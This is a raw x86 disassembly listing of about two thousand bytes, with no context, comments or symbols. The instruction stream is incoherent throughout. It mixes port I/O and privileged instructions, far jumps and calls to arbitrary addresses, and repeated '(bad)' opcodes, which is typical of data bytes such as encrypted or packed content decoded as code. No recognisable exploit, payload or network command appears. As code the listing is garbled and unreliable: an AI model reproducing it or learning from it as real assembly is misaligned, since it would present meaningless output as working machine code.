  410cc4:	push   ecx
  410cc5:	std    
  410cc6:	hlt    
  410cc7:	ret    
  410cc8:	dec    esp
  410cc9:	mov    BYTE PTR [ebp-0x2399c30a],ah
  410ccf:	jecxz  0x410cb9
  410cd1:	ret    0x62a2
  410cd4:	add    BYTE PTR [esi+ebp*1+0x45],0x89
  410cd9:	inc    ebx
  410cda:	mov    dh,0xae
  410cdc:	jno    0x410d38
  410cde:	dec    ecx
  410cdf:	stos   DWORD PTR es:[edi],eax
  410ce0:	jns    0x410cad
  410ce2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ce3:	xchg   edi,eax
  410ce4:	xor    al,0xf0
  410ce6:	loop   0x410cc0
  410ce8:	test   ch,bh
  410cea:	jo     0x410d20
  410cec:	pop    ds
  410ced:	or     DWORD PTR [edx-0xb],0xffffffee
  410cf1:	add    bl,BYTE PTR ds:0xc5d82e04
  410cf7:	bound  edx,QWORD PTR [ebp+0x4b6b0a14]
  410cfd:	scas   eax,DWORD PTR es:[edi]
  410cfe:	jne    0x410cbd
  410d00:	mov    ds:0xbf394316,eax
  410d05:	mov    ds:0xc49ea3c3,eax
  410d0a:	add    cl,bl
  410d0c:	inc    ecx
  410d0d:	sbb    al,0xd5
  410d0f:	test   DWORD PTR [ecx+0x3e],eax
  410d12:	int3   
  410d13:	fdivr  DWORD PTR ss:[ebp+0x63]
  410d17:	inc    ebp
  410d18:	lods   al,BYTE PTR ds:[esi]
  410d19:	push   edi
  410d1a:	xor    DWORD PTR [ebp+0x2bb8441b],eax
  410d20:	and    eax,0x1a83fe27
  410d25:	sahf   
  410d26:	imul   edi,DWORD PTR [eax+0x5c],0xaa006fa3
  410d2d:	dec    eax
  410d2e:	daa    
  410d2f:	stos   DWORD PTR es:[edi],eax
  410d30:	jg     0x410d93
  410d32:	xlat   BYTE PTR ds:[ebx]
  410d33:	jmp    0xa980:0xb9e92ac3
  410d3a:	inc    edx
  410d3b:	push   cs
  410d3c:	lahf   
  410d3d:	mov    ebp,0xe5dfa0fc
  410d42:	adc    ah,BYTE PTR [ecx-0x520cc499]
  410d48:	mov    BYTE PTR [ebx+0xe029aa6],dh
  410d4e:	dec    ebx
  410d50:	cmp    eax,DWORD PTR [eax+ebx*1+0x3d]
  410d54:	cmc    
  410d55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410d56:	or     DWORD PTR [edx-0x4646cef9],ecx
  410d5c:	cld    
  410d5d:	mov    ?,WORD PTR [eax]
  410d5f:	sub    DWORD PTR [ecx-0x7a],ebp
  410d62:	int    0x90
  410d64:	scas   eax,DWORD PTR es:[edi]
  410d65:	leave  
  410d66:	push   es
  410d67:	cwde   
  410d68:	jne    0x410dd5
  410d6a:	sbb    DWORD PTR [ecx],0xa8074f1d
  410d70:	retf   0xa70
  410d73:	sbb    DWORD PTR [eax-0x2a],esi
  410d76:	out    0x6d,eax
  410d78:	fist   DWORD PTR [edx-0x2323f6a8]
  410d7e:	fwait
  410d7f:	pop    esi
  410d80:	dec    esi
  410d81:	lods   al,BYTE PTR ds:[esi]
  410d82:	jmp    0x4dc807b6
  410d87:	mov    al,ds:0x57b96f26
  410d8c:	jno    0x410d81
  410d8e:	lahf   
  410d8f:	stos   DWORD PTR es:[edi],eax
  410d90:	fidiv  WORD PTR [esi-0x66758bb1]
  410d96:	mov    al,0xd4
  410d98:	(bad)  
  410d99:	fild   QWORD PTR [eax-0x2491a487]
  410d9f:	loope  0x410d35
  410da1:	push   edx
  410da2:	adc    dh,BYTE PTR [edi-0x48]
  410da5:	sbb    DWORD PTR [edx-0x5c],ecx
  410da8:	sahf   
  410da9:	sub    dl,dl
  410dab:	imul   esp,ebx,0xd2862baa
  410db1:	xor    DWORD PTR [edx+0xa0e6590],ebp
  410db7:	out    dx,al
  410db8:	add    ebx,DWORD PTR [esi-0x3a]
  410dbb:	mov    esp,0x81012b0d
  410dc0:	mov    ah,0x4
  410dc2:	dec    esp
  410dc3:	sbb    DWORD PTR [ecx],edx
  410dc5:	ds pop esp
  410dc7:	lahf   
  410dc8:	clc    
  410dc9:	mov    ebx,esi
  410dcb:	in     al,dx
  410dcc:	repz xor DWORD PTR [edx+0x7],esp
  410dd0:	adc    BYTE PTR [eax],cl
  410dd2:	push   eax
  410dd3:	and    DWORD PTR [edx],0x3
  410dd6:	add    eax,DWORD PTR [ebx-0x4b]
  410dd9:	jnp    0x410e4b
  410ddb:	cmc    
  410ddc:	fiadd  DWORD PTR [edi+0x6b]
  410ddf:	pop    edx
  410de0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410de1:	or     al,0xec
  410de3:	sbb    ch,al
  410de5:	mov    ecx,0x8558b61
  410dea:	jmp    0x4111de
  410def:	inc    edi
  410df0:	cli    
  410df1:	fisttp DWORD PTR [edx+0x517569e1]
  410df7:	jp     0x410dcf
  410df9:	xchg   ecx,eax
  410dfa:	mov    edx,0x1da86c14
  410dff:	mov    esp,0x497070b8
  410e04:	jge    0x410e76
  410e06:	jo     0x410dc9
  410e08:	dec    eax
  410e09:	cmp    DWORD PTR [ebx],ecx
  410e0b:	test   eax,0xaf6aba95
  410e10:	dec    ebx
  410e11:	mov    edx,esi
  410e13:	out    dx,al
  410e14:	mov    DWORD PTR ds:[ebx+0x665e8f26],0x27a76e5c
  410e1f:	adc    esp,esp
  410e21:	adc    BYTE PTR [ebx+esi*2-0x39],cl
  410e25:	push   edx
  410e26:	pop    ebx
  410e27:	push   ebx
  410e28:	mov    ch,bh
  410e2a:	call   0x83d07515
  410e2f:	in     eax,dx
  410e30:	xchg   esi,eax
  410e31:	and    eax,0xc93e8a69
  410e36:	cmp    al,0x73
  410e38:	repz pushf 
  410e3a:	aam    0xb1
  410e3c:	pop    ebx
  410e3d:	sbb    bh,dl
  410e3f:	retf   
  410e40:	cmp    al,0xca
  410e42:	mov    WORD PTR [eax+esi*2],ds
  410e45:	(bad)  
  410e46:	mov    ebp,0x99a7d2dd
  410e4b:	out    0x6d,al
  410e4d:	retf   0x7dfa
  410e50:	or     al,0xf5
  410e52:	mov    di,0x5905
  410e56:	sub    BYTE PTR fs:[eax],ch
  410e59:	push   ds
  410e5a:	out    dx,eax
  410e5b:	xchg   ebx,eax
  410e5c:	dec    ebx
  410e5d:	test   DWORD PTR [ebx],ecx
  410e5f:	jmp    0x410ed3
  410e61:	mov    ds:0x4e5ced3c,eax
  410e66:	fsub   QWORD PTR [ebx-0x558bab24]
  410e6c:	jnp    0x410e14
  410e6e:	(bad)  
  410e6f:	dec    ebx
  410e70:	icebp  
  410e71:	(bad)  
  410e72:	sar    DWORD PTR [edi],1
  410e74:	xor    DWORD PTR [ecx-0x5a9afb1b],esi
  410e7a:	jp     0x410ef8
  410e7c:	in     al,0xbb
  410e7e:	inc    edi
  410e7f:	mov    ecx,0x6e5f6de3
  410e84:	aas    
  410e85:	pop    edi
  410e86:	pop    ebx
  410e87:	xchg   edx,eax
  410e88:	xchg   DWORD PTR [eax-0x73880f28],ecx
  410e8e:	inc    ebp
  410e8f:	jl     0x410ea3
  410e91:	imul   edi,DWORD PTR [esi-0x6186d0c2],0x56
  410e98:	inc    ebp
  410e99:	in     eax,0x31
  410e9b:	push   ds
  410e9c:	fcom   DWORD PTR [edi+0x45]
  410e9f:	cmp    ebp,ecx
  410ea1:	xchg   ebx,eax
  410ea2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ea3:	cmp    DWORD PTR [edx-0x34d421a9],edx
  410ea9:	int3   
  410eaa:	dec    eax
  410eab:	in     eax,dx
  410eac:	xor    ecx,ecx
  410eae:	in     al,0xad
  410eb0:	or     BYTE PTR [ecx-0x51335a1d],bl
  410eb6:	(bad)  
  410eb8:	sub    BYTE PTR [eax-0x5a21a765],0x41
  410ebf:	mov    al,ds:0xe4bf5779
  410ec4:	jnp    0x410f2f
  410ec6:	mov    al,BYTE PTR [eax+0x29]
  410ec9:	js     0x410ecc
  410ecb:	xchg   ebp,eax
  410ecc:	nop
  410ecd:	mov    BYTE PTR [edx+0x3b],0xe
  410ed1:	lods   eax,DWORD PTR ds:[esi]
  410ed2:	pop    ds
  410ed3:	mov    BYTE PTR [ecx-0x510c4d44],bh
  410ed9:	xor    eax,0xc78c16ce
  410ede:	mov    dl,0xa5
  410ee0:	js     0x410e73
  410ee2:	call   0xc74c8e96
  410ee7:	mov    ebp,0xcdbcc997
  410eec:	adc    BYTE PTR [edi+ebx*2+0xe9c7b18],cl
  410ef3:	cmp    edx,DWORD PTR [esi]
  410ef5:	enter  0x4e05,0x60
  410ef9:	dec    esp
  410efa:	cs jp  0x410f28
  410efd:	js     0x410f42
  410eff:	pop    edi
  410f00:	js     0x410f0b
  410f02:	stos   BYTE PTR es:[edi],al
  410f03:	rol    DWORD PTR [esi],1
  410f05:	xor    DWORD PTR [ecx-0x29073762],edx
  410f0b:	xor    al,0x56
  410f0e:	adc    eax,ebp
  410f10:	add    al,0x8e
  410f12:	lock ret 0x7eeb
  410f16:	mov    dh,0x63
  410f18:	inc    esi
  410f19:	mov    DWORD PTR [edx],0xeb44d833
  410f1f:	jb     0x410efc
  410f21:	inc    esp
  410f22:	sbb    dh,BYTE PTR [edi+0xb4fdf87]
  410f28:	imul   ebx,DWORD PTR [edx],0xfc7d251f
  410f2e:	sbb    eax,ecx
  410f30:	not    bh
  410f32:	sbb    al,0x9a
  410f34:	or     ch,BYTE PTR [esi-0x6e94c821]
  410f3a:	sbb    edi,DWORD PTR ds:0x9b1fdc96
  410f40:	push   ecx
  410f41:	(bad)  
  410f42:	(bad)  
  410f43:	sbb    ch,BYTE PTR [eax]
  410f45:	sahf   
  410f46:	pop    es
  410f47:	xor    BYTE PTR [esi+eiz*8+0x74],dl
  410f4b:	cmp    BYTE PTR [ebp+0x50299bea],dl
  410f51:	dec    esp
  410f52:	push   ecx
  410f53:	add    eax,0x59460b70
  410f58:	mov    ch,bl
  410f5a:	icebp  
  410f5b:	rcl    DWORD PTR [esi-0x31beb247],cl
  410f61:	repnz sbb DWORD PTR [esi],esp
  410f64:	out    0xa1,al
  410f66:	xor    eax,0x4e6a25e8
  410f6b:	push   ds
  410f6c:	pop    ds
  410f6d:	(bad)  
  410f6e:	pop    edx
  410f6f:	xchg   edx,eax
  410f70:	retf   
  410f71:	inc    edi
  410f72:	push   ebp
  410f73:	imul   esp,DWORD PTR [esi],0xa2e2e14e
  410f79:	jns    0x410f60
  410f7b:	mov    dl,0x46
  410f7d:	je     0x410f03
  410f7f:	pavgb  mm2,QWORD PTR ds:0x33d35297
  410f86:	inc    ebx
  410f87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410f88:	mov    esi,0xf75e21bf
  410f8d:	xchg   ebp,eax
  410f8e:	in     eax,0xb3
  410f90:	sahf   
  410f91:	mov    bh,0x87
  410f93:	jne    0x410f3c
  410f95:	popf   
  410f96:	add    BYTE PTR [eax],al
  410f98:	imul   edi,DWORD PTR [edx-0x2b],0x70
  410f9c:	in     eax,0x14
  410f9e:	push   esi
  410f9f:	pop    eax
  410fa0:	sub    edi,DWORD PTR [eax+0xb]
  410fa3:	lea    eax,[edi+eiz*1-0x46489b73]
  410faa:	xor    BYTE PTR [eax-0x1c44489e],dl
  410fb0:	mov    esp,0xc06d185f
  410fb5:	pop    es
  410fb6:	lods   eax,DWORD PTR ds:[esi]
  410fb7:	repz in eax,0x1
  410fba:	mov    al,ds:0x2998f2f6
  410fbf:	inc    esi
  410fc0:	pusha  
  410fc1:	call   0x6489d80a
  410fc6:	push   ds
  410fc7:	push   ebx
  410fc8:	and    BYTE PTR [ecx],bh
  410fca:	hlt    
  410fcb:	std    
  410fcc:	loop   0x410f66
  410fce:	fcmove st,st(5)
  410fd0:	xor    eax,edi
  410fd2:	pop    ss
  410fd3:	cmp    eax,0x66b3cfcf
  410fd8:	xchg   BYTE PTR [eax],cl
  410fda:	fnstsw WORD PTR ds:0x1e2f8864
  410fe0:	cli    
  410fe1:	pop    edx
  410fe2:	test   esp,ebx
  410fe4:	iret   
  410fe5:	and    al,0x53
  410fe7:	cs cmc 
  410fe9:	mov    ds:0x239ea75,al
  410fee:	test   edx,ebp
  410ff0:	iret   
  410ff1:	xchg   esi,eax
  410ff2:	inc    ebx
  410ff3:	push   edx
  410ff4:	cmp    al,0xbe
  410ff6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ff7:	pusha  
  410ff8:	cmp    BYTE PTR [ebp+0x70],ch
  410ffb:	add    ah,BYTE PTR [ebp-0x56]
  410ffe:	jl     0x410fca
  411000:	imul   ecx,DWORD PTR [edx],0xffffff9e
  411003:	lods   al,BYTE PTR ds:[esi]
  411004:	stos   BYTE PTR es:[edi],al
  411005:	out    dx,al
  411006:	clc    
  411007:	adc    bh,BYTE PTR [eax]
  411009:	cmp    BYTE PTR [edx+0x7fc76a76],cl
  41100f:	rcr    BYTE PTR [ecx-0x308a75f7],cl
  411015:	inc    esi
  411016:	pop    ds
  411017:	mov    al,BYTE PTR [edi]
  411019:	cdq    
  41101a:	leave  
  41101b:	pop    ebx
  41101c:	test   DWORD PTR [eax+0x18e55ccf],esp
  411022:	sub    dl,cl
  411024:	mov    bh,0x99
  411026:	or     DWORD PTR [esi-0x5a04ed69],edi
  41102c:	cmp    eax,0x7a1b59d5
  411031:	fmulp  st(1),st
  411033:	push   esi
  411034:	call   0x408f6c68
  411039:	sbb    eax,0xfde11a8c
  41103e:	xor    al,0x26
  411040:	jmp    0x7f2b:0xae0b199
  411047:	xor    al,0x99
  411049:	inc    eax
  41104a:	inc    eax
  41104b:	mov    esp,0x82f3179a
  411050:	mov    bh,0x78
  411052:	mov    esp,0xa6e68e80
  411057:	xor    eax,0x7649fa88
  41105c:	adc    BYTE PTR ds:0x714532f6,dl
  411062:	retf   
  411063:	inc    esp
  411064:	mov    dl,0x2f
  411066:	sbb    ch,bl
  411068:	inc    ax
  41106a:	std    
  41106b:	sub    al,0xc4
  41106d:	popa   
  41106e:	add    al,0x33
  411070:	adc    al,0x63
  411072:	out    dx,eax
  411073:	das    
  411074:	icebp  
  411075:	add    DWORD PTR [ebx-0xc],edx
  411078:	pop    ss
  411079:	(bad)  
  41107a:	pop    edi
  41107b:	leave  
  41107c:	loope  0x4110cf
  41107e:	mov    DWORD PTR [edi],ecx
  411080:	adc    eax,0x2c2acae9
  411085:	ins    BYTE PTR es:[edi],dx
  411086:	jg     0x41103a
  411088:	or     dl,BYTE PTR [edi-0x3c]
  41108b:	(bad)  
  41108d:	mov    eax,0x4bc2b0a3
  411092:	repnz scas eax,DWORD PTR es:[edi]
  411094:	retf   0x340c
  411097:	sub    al,0x32
  411099:	mov    ebx,0x63ee5cbf
  41109e:	dec    esp
  41109f:	push   eax
  4110a0:	jp     0x411038
  4110a2:	lahf   
  4110a3:	mov    ds:0x58be7a8a,al
  4110a8:	push   edx
  4110a9:	pop    ecx
  4110aa:	push   edx
  4110ab:	mov    ch,0xd0
  4110ad:	js     0x41106d
  4110af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4110b0:	aad    0x7a
  4110b2:	xor    BYTE PTR [ebx+edi*1+0x4a],dh
  4110b6:	sub    eax,0x8fca662f
  4110bb:	test   al,0x6b
  4110bd:	fldcw  WORD PTR [esi-0x2f39ac83]
  4110c3:	into   
  4110c4:	into   
  4110c5:	mov    al,0xd
  4110c7:	jo     0x4110d7
  4110c9:	lds    esi,FWORD PTR [esi+0x50e1c626]
  4110cf:	cmp    dh,BYTE PTR [ebx+eiz*8]
  4110d2:	pop    es
  4110d3:	icebp  
  4110d4:	fst    QWORD PTR [ebx]
  4110d6:	add    ecx,DWORD PTR [ebx]
  4110d8:	out    dx,eax
  4110d9:	sub    al,BYTE PTR ds:0xd3c74e4f
  4110df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4110e0:	dec    edi
  4110e1:	push   ds
  4110e2:	retf   0x9df7
  4110e5:	mov    edx,0x92cbbfd9
  4110ea:	jmp    0xa9673c5a
  4110ef:	aaa    
  4110f0:	jno    0x411162
  4110f2:	shl    DWORD PTR [ecx-0x33],0x1
  4110f6:	mov    eax,0x8b4a4339
  4110fb:	fadd   st(3),st
  4110fd:	xchg   DWORD PTR [ebp+0x33],eax
  411100:	push   0xffffffa9
  411102:	ffreep st(1)
  411104:	dec    edi
  411105:	sbb    al,0x13
  411107:	lahf   
  411108:	adc    BYTE PTR [eax],bh
  41110a:	icebp  
  41110b:	mov    ch,0x29
  41110d:	loop   0x411169
  41110f:	mov    esi,0x71cd6910
  411114:	mov    eax,ds:0x97fd5a3c
  411119:	ror    DWORD PTR [ebx-0x7295e657],cl
  41111f:	sbb    BYTE PTR [ecx+0x261a1e46],ah
  411125:	in     al,0x34
  411127:	call   0x8696:0xc71cde20
  41112e:	jno    0x411111
  411130:	int3   
  411131:	in     eax,0xd6
  411133:	enter  0xd780,0xc1
  411137:	into   
  411138:	cmp    ebp,DWORD PTR [ebx]
  41113a:	jno    0x41117e
  41113c:	out    0x4c,al
  41113e:	imul   edx,esp,0xe
  411141:	aam    0xeb
  411143:	or     DWORD PTR [eax+0x4b],eax
  411146:	add    DWORD PTR [edx-0x57],0x2a
  41114a:	mov    eax,0x387063a7
  41114f:	or     eax,0xa524cff9
  411154:	fnsave [ecx-0x7846d285]
  41115a:	pop    ds
  41115b:	cs in  al,dx
  41115d:	je     0x41112a
  41115f:	fidiv  WORD PTR [ebp+0x3f]
  411162:	dec    eax
  411163:	fdivr  QWORD PTR [edx+0x29231ca5]
  411169:	sbb    ecx,DWORD PTR [ecx+0x71]
  41116c:	mov    ds:0x9553ed7b,eax
  411171:	popf   
  411172:	lahf   
  411173:	clc    
  411174:	mov    bh,0xa
  411176:	loope  0x4110fc
  411178:	out    dx,al
  411179:	inc    ecx
  41117a:	sub    eax,0xa2547978
  41117f:	test   eax,0x433e3806
  411184:	jg     0x411153
  411186:	(bad)  
  411187:	push   cs
  411188:	std    
  411189:	in     al,0x75
  41118b:	into   
  41118c:	adc    ah,BYTE PTR [ebx]
  41118e:	sbb    edx,DWORD PTR [bp+di-0x4bbc]
  411193:	mov    cl,0x9e
  411195:	in     eax,dx
  411196:	fcom   DWORD PTR [edx-0x10403e9a]
  41119c:	call   0xf6c229a8
  4111a1:	push   cs
  4111a2:	ficomp DWORD PTR [ebp-0x12]
  4111a5:	outs   dx,DWORD PTR ds:[esi]
  4111a6:	pop    ss
  4111a7:	jbe    0x41118c
  4111a9:	jge    0x4111b5
  4111ab:	mov    bl,0x12
  4111ad:	push   ebp
  4111ae:	aad    0x12
  4111b0:	aaa    
  4111b1:	and    eax,0x9b62abb4
  4111b6:	retf   
  4111b7:	mov    bh,BYTE PTR [esi+0x1a77c18a]
  4111bd:	repnz lods al,BYTE PTR ds:[esi]
  4111bf:	mov    eax,ds:0x62734733
  4111c4:	and    BYTE PTR [ebp+edx*8+0x3d9fce33],bh
  4111cb:	shr    BYTE PTR [esi-0x7f],0x98
  4111cf:	aas    
  4111d0:	in     al,dx
  4111d1:	rol    DWORD PTR [esi-0x4b],0xd8
  4111d5:	nop
  4111d6:	xor    eax,0x1e06f625
  4111db:	xchg   esi,eax
  4111dc:	out    dx,al
  4111dd:	push   ebp
  4111de:	xor    eax,ecx
  4111e0:	lea    eax,[eax+edx*1+0x32729c]
  4111e7:	mov    DWORD PTR [ebp+0x8],eax
  4111ea:	mov    eax,DWORD PTR [ebp-0x18]
  4111ed:	jmp    0x4115e1
  4111f2:	mov    al,0x3c
  4111f4:	fwait
  4111f5:	xchg   ebx,eax
  4111f6:	fwait
  4111f7:	jae    0x411261
  4111f9:	rol    DWORD PTR [ebp-0x67bca301],cl
  4111ff:	and    bl,BYTE PTR [eax]
  411201:	adc    eax,0x70704495
  411206:	dec    ecx
  411207:	jge    0x411279
  411209:	jo     0x41124e
  41120b:	loopne 0x4111ad
  41120d:	arpl   WORD PTR [esi+ebp*2],bp
  411210:	xor    edx,DWORD PTR [edi]
  411212:	cmp    DWORD PTR [ecx-0x735ddade],ecx
  411218:	rol    DWORD PTR [ecx+0x5edf37d4],1
  41121e:	xor    DWORD PTR [edx+0x6611259],0xdbdec727
  411228:	adc    cl,ah
  41122a:	cmovge bx,WORD PTR [eax+0x559cc193]
  411232:	pop    esi
  411233:	and    eax,0x226061d3
  411238:	idiv   BYTE PTR [edi+ebp*8-0x53]
  41123c:	in     eax,0x22
  41123e:	jmp    0x411228
  411240:	lods   al,BYTE PTR ds:[esi]
  411241:	out    0x87,al
  411243:	push   eax
  411244:	stc    
  411245:	aad    0xaf
  411247:	into   
  411248:	retf   
  411249:	dec    esp
  41124a:	sub    eax,0x50467ea2
  41124f:	loopne 0x41129a
  411251:	mov    ch,0x26
  411253:	shr    DWORD PTR [ecx-0x38842816],cl
  411259:	sub    eax,0x639558b9
  41125e:	retf   
  41125f:	mov    bh,0x46
  411261:	xor    al,0x24
  411263:	loope  0x4112e4
  411265:	dec    eax
  411266:	cdq    
  411267:	pop    ss
  411268:	adc    DWORD PTR [edi],0x3d7725b6
  41126e:	and    al,0xba
  411270:	mov    ecx,0xd305c8c9
  411275:	adc    ah,bh
  411277:	pusha  
  411278:	nop
  411279:	lods   eax,DWORD PTR ds:[esi]
  41127a:	push   es
  41127b:	fxch   st(3)
  41127d:	(bad)  
  41127e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41127f:	pop    ds
  411280:	inc    ecx
  411281:	imul   eax,DWORD PTR [edx-0xf],0xc0137ab4
  411288:	mov    ecx,0xb9f0f1a3
  41128d:	inc    esi
  41128e:	jmp    0x4112a8
  411290:	and    esi,edi
  411292:	leave  
  411293:	lahf   
  411294:	push   esp
  411295:	push   ss
  411296:	fsub   st,st(3)
  411298:	jb     0x4112dc
  41129a:	xlat   BYTE PTR ds:[ebx]
  41129b:	mov    bh,0x81
  41129d:	push   ebx
  41129e:	xor    esp,eax
  4112a0:	int    0x3c
  4112a2:	xchg   ecx,eax
  4112a3:	pop    eax
  4112a4:	popf   
  4112a5:	add    bl,al
  4112a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4112a8:	out    dx,al
  4112a9:	in     eax,0x16
  4112ab:	cdq    
  4112ac:	add    eax,0x32fd3865
  4112b1:	push   eax
  4112b2:	xor    eax,0x6f82f00e
  4112b7:	out    dx,al
  4112b8:	popf   
  4112b9:	sub    al,dl
  4112bb:	dec    ecx
  4112bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4112bd:	sbb    al,al
  4112bf:	stos   BYTE PTR es:[edi],al
  4112c0:	or     al,BYTE PTR [eax-0x2169bcdc]
  4112c6:	das    
  4112c7:	push   ecx
  4112c8:	pop    ecx
  4112c9:	add    edx,esi
  4112cb:	cmp    eax,0xbc0a3424
  4112d0:	pop    ds
  4112d1:	mov    esp,0x42342ed7
  4112d6:	repz or BYTE PTR [ecx],cl
  4112d9:	add    al,0xd4
  4112db:	(bad)  
  4112dc:	sub    ebp,ebx
  4112de:	aam    0xd7
  4112e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4112e1:	ins    DWORD PTR es:[edi],dx
  4112e2:	adc    edi,DWORD PTR [esi-0xd]
  4112e5:	cli    
  4112e6:	lds    eax,FWORD PTR [eax]
  4112e8:	dec    esi
  4112e9:	(bad)  
  4112ea:	repnz xchg esp,eax
  4112ec:	out    dx,al
  4112ed:	jbe    0x4112ab
  4112ef:	mov    eax,0xdbfbd806
  4112f4:	mov    ah,0x1d
  4112f6:	les    esp,FWORD PTR [edi]
  4112f8:	sub    ebp,ebx
  4112fa:	pop    ebx
  4112fb:	int3   
  4112fc:	or     eax,0xa5f3b036
  411301:	leave  
  411302:	add    BYTE PTR [edi],dl
  411304:	cli    
  411305:	fmul   DWORD PTR [esi]
  411307:	mov    WORD PTR [ebx+edi*1+0x44311866],?
  41130e:	sti    
  41130f:	add    bh,0x7a
  411312:	mov    esi,0xfd788684
  411317:	jecxz  0x4112d2
  411319:	jle    0x4112da
  41131b:	adc    BYTE PTR [si+0x6e],bh
  41131f:	(bad)  
  411320:	out    0x3d,eax
  411322:	mov    eax,ds:0x13661c31
  411327:	das    
  411328:	adc    eax,0xbc766c91
  41132d:	mov    bl,0x9
  41132f:	js     0x4112b4
  411331:	cmp    eax,0x40e66bb9
  411336:	outs   dx,DWORD PTR ds:[esi]
  411337:	call   0x87c4c4b0
  41133c:	icebp  
  41133d:	out    dx,eax
  41133e:	mov    al,0xaf
  411340:	xchg   al,dl
  411342:	fisub  WORD PTR [edx-0x32]
  411345:	cli    
  411346:	out    0x34,eax
  411348:	fist   DWORD PTR [edx]
  41134a:	shl    BYTE PTR [edi+0x5737e000],cl
  411350:	pusha  
  411351:	call   0x53e517d2
  411356:	mov    ebp,0x21d1a0b1
  41135b:	push   esp
  41135c:	(bad)  [ebx]
  41135e:	into   
  41135f:	ds xor al,0x7d
  411362:	push   ebx
  411363:	dec    eax
  411364:	mov    ch,0xe8
  411366:	dec    ebp
  411367:	popa   
  411368:	outs   dx,DWORD PTR ds:[esi]
  411369:	mov    DWORD PTR [ebx+0x45],eax
  41136c:	test   eax,0x233f5a00
  411371:	jae    0x411376
  411373:	mov    edi,0x6a4bd6c7
  411378:	cs enter 0x2744,0x19
  41137d:	lods   eax,DWORD PTR ds:[esi]
  41137e:	(bad)  
  411380:	inc    eax
  411381:	out    dx,al
  411382:	xchg   ebp,eax
  411383:	push   es
  411384:	fst    QWORD PTR [ebx+0x5c]
  411387:	arpl   WORD PTR [esi],sp
  411389:	mov    ebx,0x2b6d5330
  41138e:	cs sbb eax,0xfa762cb0
  411394:	cmc    
  411395:	dec    edx
  411396:	cmp    ah,BYTE PTR [eax+ebx*1-0x6e]
  41139a:	jae    0x411411
  41139c:	jg     0x4113b7
  41139e:	pop    es
  41139f:	jnp    0x41136a
  4113a1:	ins    BYTE PTR es:[edi],dx
  4113a2:	arpl   si,bx
  4113a4:	adc    eax,0x495bdf55
  4113a9:	mov    DWORD PTR [ebp-0x3c291f4b],edx
  4113af:	aad    0x3c
  4113b1:	cmp    esp,edi
  4113b3:	adc    eax,0xaf572b9f
  4113b8:	mov    cl,0x56
  4113ba:	cmc    
  4113bb:	test   al,0x7c
  4113bd:	mov    ah,0xe
  4113bf:	cli    
  4113c0:	ss call 0x99eeb4ad
  4113c6:	cdq    
  4113c7:	in     eax,0x9d
  4113c9:	sbb    bl,BYTE PTR [eax-0x63fe7499]
  4113cf:	or     edi,DWORD PTR [eax-0x3f]
  4113d2:	mov    ch,0x96
  4113d4:	fidiv  DWORD PTR [ebp+0x5e]
  4113d7:	cmc    
  4113d8:	and    ch,BYTE PTR [ecx]
  4113da:	sbb    edx,DWORD PTR [edx+0x5e69de48]
  4113e0:	push   ds
  4113e1:	jg     0x4113ec
  4113e3:	std    
  4113e4:	and    BYTE PTR [ebx+0x1d63defa],0x9c
  4113eb:	sti    
  4113ec:	and    DWORD PTR [ebp+ebx*8-0x5935f408],edi
  4113f3:	out    dx,eax
  4113f4:	xchg   DWORD PTR [ebx+0x4d5651e8],ebx
  4113fa:	mov    ebp,0x8f503a61
  4113ff:	cmp    esi,DWORD PTR [esi-0x77]
  411402:	pop    edx
  411403:	sub    cl,BYTE PTR ds:0x8b1cf8b7
  411409:	dec    BYTE PTR [edx+0x30dace34]
  41140f:	bnd jbe 0x41139e
  411412:	mov    ds:0x31bf5db4,al
  411417:	adc    BYTE PTR [edi+0x1730946c],dh
  41141d:	ins    BYTE PTR es:[edi],dx
  41141e:	in     eax,dx
  41141f:	mov    ebp,0x7b1e78ac
  411424:	xchg   ecx,eax
  411425:	(bad)  
  411426:	sub    eax,0xd5f8cbac
  41142b:	(bad)  
  41142c:	fild   WORD PTR ds:[ecx+0x6cd4339]
  411433:	fcomp  QWORD PTR [ebx+esi*1+0x17e16569]
  41143a:	mov    bh,0xab
  41143c:	ins    BYTE PTR es:[edi],dx
  41143d:	fisttp QWORD PTR [eax-0x7dfc1206]
  411443:	jb     0x41147b
  411445:	lods   al,BYTE PTR ds:[esi]
  411446:	imul   edx,ebx,0x67
  411449:	pop    eax
  41144a:	xor    BYTE PTR [ecx+0x7935ec28],dl
  411450:	mov    dh,0x4f
  411452:	fcmovb st,st(0)
  411454:	and    cl,dl
  411456:	and    DWORD PTR [ebx+edi*1+0x1353128f],ebp
  41145d:	pop    ebp
  41145e:	inc    esi
  41145f:	pop    edi
  411460:	mov    edx,0xf5f8d9f9
  411465:	inc    ebx
  411466:	into   
  411467:	inc    ebx
  411468:	enter  0xad9d,0xdb
  41146c:	mov    ds:0x422a140c,eax
  411471:	ficom  DWORD PTR [ebx-0x6d]
  411474:	loopne 0x411422
  411476:	cmp    dl,BYTE PTR [esi-0x6f6d4521]
  41147c:	out    dx,eax
  41147d:	xchg   ebp,eax
  41147e:	fcom   QWORD PTR [ecx+ebx*4+0x1a6efd79]
  411485:	lea    esp,[ebx]
  411487:	sbb    BYTE PTR [esi+esi*2-0x42],ch
  41148b:	lds    eax,FWORD PTR [ecx+eiz*1-0x1d]
  41148f:	xchg   edx,eax
  411490:	mov    al,ds:0x2b9c6a4f
  411495:	(bad)  
  411496:	adc    edx,eax
  411498:	add    ch,dl
  41149a:	mov    dl,0xde
  41149c:	arpl   di,cx
  41149e:	out    dx,al
  41149f:	xchg   edi,eax
  4114a0:	call   0xc79cfa88
  4114a5:	inc    eax
  4114a6:	shl    edx,cl
  4114a8:	mov    edx,0xdaeceb22
  4114ad:	inc    ebx
  4114ae:	clc    
  4114af:	or     edx,DWORD PTR [esi-0x593b3552]
  4114b5:	xchg   ebp,eax
  4114b6:	ret    
  4114b7:	adc    BYTE PTR [ebx],0xce
  4114ba:	daa    
